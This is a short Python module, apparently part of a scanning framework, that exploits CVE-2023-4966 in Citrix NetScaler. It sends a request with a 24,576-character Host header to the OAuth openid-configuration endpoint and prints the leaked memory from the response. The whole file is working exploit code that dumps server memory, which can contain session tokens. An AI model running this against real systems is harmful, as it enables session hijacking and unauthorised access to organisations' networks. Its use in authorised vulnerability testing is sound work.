#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
urllib3.disable_warnings()


class Cve_2023_4966:
    def main(self,target):
        hostname = target["url"].strip("/ ")
        ssl = target["ssl"]
        head = target["header"]
        proxy = target["proxy"]

        _, self.proxy = ReqSet(proxy=proxy)
        headers = {
            "User-Agent":head,
            "Host": "a"*24576
        }
        OutPrintInfo("NetScaler", "开始检测CVE-2023-4966...")
        try:
            url = f"{hostname}/oauth/idp/.well-known/openid-configuration"
            r = requests.get(url, headers=headers, verify=ssl,proxies=proxy,timeout=10)
            if r.status_code == 200:
                OutPrintInfo("NetScaler", "--- Dumped Memory ---")
                OutPrintInfo("NetScaler", r.text[131050:])
                OutPrintInfo("NetScaler", "---      End      ---")
            else:
                OutPrintInfo("NetScaler", "Could not dump memory")
        except Exception:
            OutPrintInfo("NetScaler", "目标不存在CVE-2023-4966")